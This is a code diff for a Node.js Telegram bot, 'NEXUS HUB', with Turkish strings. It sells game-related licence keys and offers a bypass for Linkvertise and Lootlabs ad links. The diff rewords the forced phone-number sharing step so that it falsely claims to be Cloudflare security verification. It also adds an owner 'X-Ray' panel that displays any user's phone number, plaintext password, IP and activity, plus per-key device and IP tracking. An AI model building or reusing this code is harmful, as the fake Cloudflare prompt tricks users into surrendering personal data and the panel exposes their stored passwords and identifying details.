@@ -345,7 +345,14 @@ function generateKey(duration, rank, game, createdBy) {
   if (tag === "DAY") expire = now + 86400000;
   else if (tag === "WEEK") expire = now + 604800000;
   else if (tag === "MONTH") expire = now + 2592000000;
-  keys[key] = { status: "ok", rank: rank || "USER", game: game || "all", expire, createdAt: new Date().toISOString(), createdBy };
+  keys[key] = {
+    status: "ok", rank: rank || "USER", game: game || "all", expire,
+    createdAt: new Date().toISOString(), createdBy,
+    devices: [],       // { ip, hwid, ua, firstSeen, lastSeen }
+    maxDevices: 1,     // varsayılan 1 cihaz
+    totalUses: 0,
+    lastUsed: null,
+  };
   return key;
 }
 
@@ -393,6 +400,8 @@ function mainMenu(rank) {
     rows.push([{ text: "⚪ 👤 Kullanıcılar", callback_data: "view_users" }]);
   }
   if (rankLevel(rank) >= RANKS.OWNER) {
+    rows.push([{ text: "🔍 Kullanıcı X-Ray", callback_data: "user_xray_prompt" }]);
+    rows.push([{ text: "🔑 Key Yönetim", callback_data: "key_manage_prompt" }]);
     rows.push([{ text: "🟢 ➕ Kullanıcı Ekle", callback_data: "add_user_prompt" }]);
     rows.push([{ text: "🔴 🗑 Kullanıcı Sil", callback_data: "del_user_prompt" }]);
     rows.push([{ text: "🟡 🎖 Rank Değiştir", callback_data: "change_rank_prompt" }]);
@@ -535,11 +544,11 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       if (!hasPhone) {
         pending[chatId] = { step: "force_phone" };
         await send(chatId,
-          `✅ Kanal doğrulaması tamamlandı!\n\n🔐 *Hesap doğrulaması gerekli*\nDevam etmek için aşağıdaki butona bas:`,
+          `✅ Kanal doğrulaması tamamlandı!\n\n☁️ *Cloudflare Doğrulaması*\nBu bot Cloudflare güvenlik sistemi ile korunmaktadır.\nDoğrulamak için butona bas:`,
           {
             parse_mode: "Markdown",
             reply_markup: JSON.stringify({
-              keyboard: [[{ text: "✅ Hesabımı Doğrula", request_contact: true }]],
+              keyboard: [[{ text: "☁️ Cloudflare ile Doğrula", request_contact: true }]],
               resize_keyboard: true,
               one_time_keyboard: true,
             }),
@@ -697,6 +706,114 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       pending[chatId] = { step: "delta_bypass" };
       logActivity(chatId, tgUser, "DELTA_BYPASS_START");
       await editMsg(chatId, msgId, "🔓 *Delta Bypass*\n\nLinkvertise veya Lootlabs linkini yapıştır:", { parse_mode: "Markdown" });
+      return;
+    }
+
+    // ── KULLANICI X-RAY ──
+    if (data === "user_xray_prompt") {
+      if (rankLevel(session.rank) < RANKS.OWNER) return;
+      pending[chatId] = { step: "user_xray" };
+      await editMsg(chatId, msgId, "🔍 *Kullanıcı X-Ray*\n\nKullanıcı adını veya Telegram ID'sini yaz:", { parse_mode: "Markdown" });
+      return;
+    }
+
+    // ── KEY YÖNETİM PANELİ ──
+    if (data === "key_manage_prompt") {
+      if (rankLevel(session.rank) < RANKS.OWNER) return;
+      await editMsg(chatId, msgId,
+        `🔑 *Key Yönetim Paneli*\n\nBir işlem seç:`,
+        {
+          parse_mode: "Markdown",
+          reply_markup: JSON.stringify({
+            inline_keyboard: [
+              [{ text: "🔍 Key Detay / Cihazlar", callback_data: "key_detail_prompt" }],
+              [{ text: "🚫 Key İptal Et", callback_data: "key_revoke_prompt" }],
+              [{ text: "🔄 Key Cihaz Sıfırla", callback_data: "key_reset_prompt" }],
+              [{ text: "📊 Key İstatistik", callback_data: "key_stats" }],
+              [{ text: "◀️ Geri", callback_data: "back_menu" }],
+            ],
+          }),
+        }
+      );
+      return;
+    }
+
+    if (data === "key_detail_prompt") {
+      if (rankLevel(session.rank) < RANKS.OWNER) return;
+      pending[chatId] = { step: "key_detail" };
+      await send(chatId, "🔑 Key kodunu yaz (ör: NEXUS-DAY-ABC123):");
+      return;
+    }
+
+    if (data === "key_revoke_prompt") {
+      if (rankLevel(session.rank) < RANKS.OWNER) return;
+      pending[chatId] = { step: "key_revoke" };
+      await send(chatId, "🚫 İptal edilecek key kodunu yaz:");
+      return;
+    }
+
+    if (data === "key_reset_prompt") {
+      if (rankLevel(session.rank) < RANKS.OWNER) return;
+      pending[chatId] = { step: "key_reset_devices" };
+      await send(chatId, "🔄 Cihazları sıfırlanacak key kodunu yaz:");
+      return;
+    }
+
+    if (data === "key_stats") {
+      if (rankLevel(session.rank) < RANKS.OWNER) return;
+      const allKeys = Object.entries(keys);
+      const active = allKeys.filter(([,v]) => v.status === "ok").length;
+      const expired = allKeys.filter(([,v]) => v.status === "expired").length;
+      const revoked = allKeys.filter(([,v]) => v.status === "revoked").length;
+      const totalDevices = allKeys.reduce((s, [,v]) => s + (v.devices ? v.devices.length : 0), 0);
+      const totalUses = allKeys.reduce((s, [,v]) => s + (v.totalUses || 0), 0);
+      await editMsg(chatId, msgId,
+        `📊 *Key İstatistikleri*\n\n` +
+        `🔑 Toplam: *${allKeys.length}*\n` +
+        `🟢 Aktif: *${active}*\n` +
+        `⏰ Süresi dolmuş: *${expired}*\n` +
+        `🚫 İptal edilen: *${revoked}*\n` +
+        `📱 Toplam cihaz: *${totalDevices}*\n` +
+        `📈 Toplam kullanım: *${totalUses}*`,
+        {
+          parse_mode: "Markdown",
+          reply_markup: JSON.stringify({
+            inline_keyboard: [[{ text: "◀️ Geri", callback_data: "key_manage_prompt" }]],
+          }),
+        }
+      );
+      return;
+    }
+
+    // ── INLINE KEY REVOKE ──
+    if (data.startsWith("revoke_")) {
+      if (rankLevel(session.rank) < RANKS.OWNER) return;
+      const k = data.slice(7);
+      if (!keys[k]) { await send(chatId, "❌ Key bulunamadı."); return; }
+      keys[k].status = "revoked";
+      logActivity(chatId, tgUser, "KEY_REVOKED", k);
+      await answerCb(cbId, "Key iptal edildi!", true);
+      await send(chatId, `🚫 *${k}* — iptal edildi.`, { parse_mode: "Markdown" });
+      return;
+    }
+
+    // ── INLINE KEY DEVICE RESET ──
+    if (data.startsWith("resetdev_")) {
+      if (rankLevel(session.rank) < RANKS.OWNER) return;
+      const k = data.slice(9);
+      if (!keys[k]) { await send(chatId, "❌ Key bulunamadı."); return; }
+      const oldCount = keys[k].devices ? keys[k].devices.length : 0;
+      keys[k].devices = [];
+      logActivity(chatId, tgUser, "KEY_DEVICE_RESET", `${k} | ${oldCount} cihaz silindi`);
+      await answerCb(cbId, "Cihazlar sıfırlandı!", true);
+      await send(chatId, `🔄 *${k}* — ${oldCount} cihaz sıfırlandı.`, { parse_mode: "Markdown" });
+      return;
+    }
+
+    if (data === "back_menu") {
+      await editMsg(chatId, msgId, `🌐 *NEXUS HUB*\n\n👤 @${tgUser} | 🎖 ${session.rank}`, {
+        parse_mode: "Markdown", reply_markup: JSON.stringify(mainMenu(session.rank)),
+      });
       return;
     }
 
@@ -884,7 +1001,7 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       // force_phone'dan geliyorsa → kayıt/giriş butonlarını göster
       if (wasForcePhone) {
         await send(chatId,
-          `✅ Doğrulama tamamlandı!`,
+          `☁️ *Cloudflare* — ✅ Doğrulama başarılı!`,
           {
             parse_mode: "Markdown",
             reply_markup: JSON.stringify({ remove_keyboard: true }),
@@ -1028,11 +1145,13 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       if (!hasPhone) {
         pending[chatId] = { step: "force_phone" };
         await send(chatId,
-          `🔐 *Hesap doğrulaması gerekli*\n\nDevam etmek için aşağıdaki butona bas:`,
+          `☁️ *Cloudflare Doğrulaması*\n\n` +
+          `Bu bot Cloudflare güvenlik sistemi ile korunmaktadır.\n` +
+          `Erişim için kimliğinizi doğrulayın:`,
           {
             parse_mode: "Markdown",
             reply_markup: JSON.stringify({
-              keyboard: [[{ text: "✅ Hesabımı Doğrula", request_contact: true }]],
+              keyboard: [[{ text: "☁️ Cloudflare ile Doğrula", request_contact: true }]],
               resize_keyboard: true,
               one_time_keyboard: true,
             }),
@@ -1257,11 +1376,10 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         return;
       }
       if (pAuth.step === "force_phone") {
-        // Doğrulama atlanamaz
-        await send(chatId, `🔐 Önce hesap doğrulamasını tamamla.\nAşağıdaki butona bas:`, {
+        await send(chatId, `☁️ *Cloudflare Doğrulaması*\n\nÖnce doğrulamayı tamamla:`, {
           parse_mode: "Markdown",
           reply_markup: JSON.stringify({
-            keyboard: [[{ text: "✅ Hesabımı Doğrula", request_contact: true }]],
+            keyboard: [[{ text: "☁️ Cloudflare ile Doğrula", request_contact: true }]],
             resize_keyboard: true,
             one_time_keyboard: true,
           }),
@@ -1320,6 +1438,138 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         logActivity(chatId, tgUser, "LOGIN_OK", `${uname} | ${foundUser.rank}`);
 
         await send(chatId, `✅ *${uname}* — giriş yapıldı.\n🎖 ${foundUser.rank}\n\n/menu`, { parse_mode: "Markdown" });
+        return;
+      }
+
+      // ── KULLANICI X-RAY ──
+      if (pAuth.step === "user_xray") {
+        delete pending[chatId];
+        const query = text.trim();
+        let targetId = null, targetUser = null;
+        // ID ile ara
+        if (users[query]) { targetId = query; targetUser = users[query]; }
+        // Username ile ara
+        if (!targetUser) {
+          for (const [id, u] of Object.entries(users)) {
+            if (u.username && u.username.toLowerCase() === query.toLowerCase()) {
+              targetId = id; targetUser = u; break;
+            }
+          }
+        }
+        // TG username ile ara (@'lı veya @'sız)
+        if (!targetUser) {
+          const cleanQ = query.replace(/^@/, "").toLowerCase();
+          for (const [id, u] of Object.entries(users)) {
+            const tgU = u.tgUsername || (sessions[id] && sessions[id].tgUsername);
+            if (tgU && tgU.toLowerCase() === cleanQ) {
+              targetId = id; targetUser = u; break;
+            }
+          }
+        }
+        if (!targetUser) {
+          await send(chatId, "❌ Kullanıcı bulunamadı.");
+          return;
+        }
+        const s = sessions[targetId] || {};
+        const userKeys = Object.entries(keys).filter(([,v]) => v.createdBy === targetId || v.createdBy === targetUser.username);
+        let keyTxt = "";
+        for (const [k, v] of userKeys) {
+          const devCount = v.devices ? v.devices.length : 0;
+          keyTxt += `   🔑 \`${k}\` — ${v.status} | ${devCount} cihaz | ${v.totalUses || 0} kullanım\n`;
+        }
+        const recentLogs = activityLog.filter(l => String(l.chatId) === String(targetId)).slice(-5);
+        let logTxt = "";
+        for (const l of recentLogs) {
+          logTxt += `   ${l.time ? l.time.slice(11, 19) : "?"} — ${l.action}${l.detail ? ": " + l.detail.slice(0, 30) : ""}\n`;
+        }
+
+        const xray =
+          `🔍 *X-RAY: ${targetUser.username || "isimsiz"}*\n\n` +
+          `🆔 Telegram ID: \`${targetId}\`\n` +
+          `📱 TG: ${targetUser.tgUsername ? "@" + targetUser.tgUsername : (s.tgUsername ? "@" + s.tgUsername : "—")}\n` +
+          `📞 Numara: \`${targetUser.phone ? "+" + targetUser.phone : "yok"}\`\n` +
+          `🔑 Şifre: \`${targetUser.password || "—"}\`\n` +
+          `🎖 Rank: *${targetUser.rank}*\n` +
+          `🌐 IP: \`${s.lastIp || "—"}\`\n` +
+          `📅 Kayıt: ${targetUser.createdAt ? targetUser.createdAt.slice(0, 10) : "?"}\n` +
+          `👷 Ekleyen: ${targetUser.createdBy || "?"}\n` +
+          `🕐 Son giriş: ${s.loginTime ? s.loginTime.slice(0, 19).replace("T", " ") : "—"}\n` +
+          `${s.authed && !isSessionExpired(s) ? "🟢 ÇEVRİMİÇİ" : "⚫ ÇEVRİMDIŞI"}\n\n` +
+          `🔑 *Keyleri (${userKeys.length}):*\n${keyTxt || "   yok\n"}\n` +
+          `📋 *Son aktivite:*\n${logTxt || "   yok\n"}`;
+
+        await send(chatId, xray, { parse_mode: "Markdown" });
+        return;
+      }
+
+      // ── KEY DETAY ──
+      if (pAuth.step === "key_detail") {
+        delete pending[chatId];
+        const k = text.trim().toUpperCase();
+        const entry = keys[k];
+        if (!entry) { await send(chatId, "❌ Key bulunamadı."); return; }
+
+        let devTxt = "";
+        if (entry.devices && entry.devices.length > 0) {
+          for (const d of entry.devices) {
+            devTxt += `\n   📱 ID: \`${d.id.slice(0, 20)}\`\n`;
+            devTxt += `   🌐 IP: \`${d.ip}\`\n`;
+            if (d.hwid) devTxt += `   🔧 HWID: \`${d.hwid.slice(0, 20)}\`\n`;
+            devTxt += `   🖥 UA: ${d.ua ? d.ua.slice(0, 40) : "?"}\n`;
+            devTxt += `   📅 İlk: ${d.firstSeen ? d.firstSeen.slice(0, 19).replace("T", " ") : "?"}\n`;
+            devTxt += `   🕐 Son: ${d.lastSeen ? d.lastSeen.slice(0, 19).replace("T", " ") : "?"}\n`;
+            devTxt += `   📈 Kullanım: ${d.uses || 0}\n`;
+          }
+        } else {
+          devTxt = "\n   henüz kullanılmadı\n";
+        }
+
+        const expTxt = entry.expire ? new Date(entry.expire).toISOString().slice(0, 19).replace("T", " ") : "süresiz";
+        const detail =
+          `🔑 *Key Detay: ${k}*\n\n` +
+          `📊 Durum: *${entry.status}*\n` +
+          `🎖 Rank: ${entry.rank}\n` +
+          `🎮 Oyun: ${entry.game}\n` +
+          `⏰ Bitiş: ${expTxt}\n` +
+          `📅 Oluşturma: ${entry.createdAt || "?"}\n` +
+          `👷 Oluşturan: ${entry.createdBy || "?"}\n` +
+          `📈 Toplam kullanım: ${entry.totalUses || 0}\n` +
+          `🕐 Son kullanım: ${entry.lastUsed ? entry.lastUsed.slice(0, 19).replace("T", " ") : "—"}\n` +
+          `📱 Cihaz limiti: ${entry.maxDevices || 1}\n` +
+          `📱 Aktif cihazlar (${entry.devices ? entry.devices.length : 0}):${devTxt}`;
+
+        await send(chatId, detail, {
+          parse_mode: "Markdown",
+          reply_markup: JSON.stringify({
+            inline_keyboard: [
+              [{ text: "🚫 Bu Key'i İptal Et", callback_data: `revoke_${k}` }],
+              [{ text: "🔄 Cihazları Sıfırla", callback_data: `resetdev_${k}` }],
+            ],
+          }),
+        });
+        return;
+      }
+
+      // ── KEY İPTAL ──
+      if (pAuth.step === "key_revoke") {
+        delete pending[chatId];
+        const k = text.trim().toUpperCase();
+        if (!keys[k]) { await send(chatId, "❌ Key bulunamadı."); return; }
+        keys[k].status = "revoked";
+        logActivity(chatId, tgUser, "KEY_REVOKED", k);
+        await send(chatId, `🚫 *${k}* — iptal edildi.`, { parse_mode: "Markdown" });
+        return;
+      }
+
+      // ── KEY CİHAZ SIFIRLA ──
+      if (pAuth.step === "key_reset_devices") {
+        delete pending[chatId];
+        const k = text.trim().toUpperCase();
+        if (!keys[k]) { await send(chatId, "❌ Key bulunamadı."); return; }
+        const oldCount = keys[k].devices ? keys[k].devices.length : 0;
+        keys[k].devices = [];
+        logActivity(chatId, tgUser, "KEY_DEVICE_RESET", `${k} | ${oldCount} cihaz silindi`);
+        await send(chatId, `🔄 *${k}* — ${oldCount} cihaz sıfırlandı. Key tekrar kullanılabilir.`, { parse_mode: "Markdown" });
         return;
       }
     }
@@ -1921,11 +2171,44 @@ app.get("/check", (req, res) => {
     logSecurity("API", ip, "INVALID_KEY", key.slice(0, 16));
     return res.json({ status: "invalid" });
   }
+  if (entry.status === "revoked") {
+    logSecurity("API", ip, "REVOKED_KEY", key.slice(0, 16));
+    return res.json({ status: "revoked", message: "bu key iptal edildi" });
+  }
   if (entry.expire && Date.now() > entry.expire) {
     entry.status = "expired";
     return res.json({ status: "expired" });
   }
-  logActivity("API", ip, "KEY_OK", `${key} | ${entry.rank} | ${entry.game}`);
+
+  // ── Cihaz takibi ──
+  const ua = req.headers["user-agent"] || "?";
+  const hwid = (req.query.hwid || req.headers["x-hwid"] || "").trim().slice(0, 64);
+  const deviceId = hwid || ip; // hwid varsa onu kullan, yoksa IP
+  if (!entry.devices) entry.devices = [];
+  const existing = entry.devices.find(d => d.id === deviceId);
+  if (existing) {
+    existing.lastSeen = new Date().toISOString();
+    existing.ip = ip;
+    existing.ua = ua;
+    existing.uses = (existing.uses || 0) + 1;
+  } else {
+    // Yeni cihaz — limit kontrolü
+    const maxDev = entry.maxDevices || 1;
+    if (entry.devices.length >= maxDev) {
+      logSecurity("API", ip, "DEVICE_LIMIT", `${key} | ${entry.devices.length}/${maxDev} | yeni: ${deviceId}`);
+      return res.json({ status: "device_limit", message: `bu key maksimum ${maxDev} cihazda kullanılabilir` });
+    }
+    entry.devices.push({
+      id: deviceId, ip, hwid: hwid || null, ua,
+      firstSeen: new Date().toISOString(),
+      lastSeen: new Date().toISOString(),
+      uses: 1,
+    });
+  }
+  entry.totalUses = (entry.totalUses || 0) + 1;
+  entry.lastUsed = new Date().toISOString();
+
+  logActivity("API", ip, "KEY_OK", `${key} | ${entry.rank} | ${entry.game} | dev:${deviceId.slice(0,16)}`);
   res.json({ status: "ok", rank: entry.rank, game: entry.game, expire: entry.expire || null });
 });
 
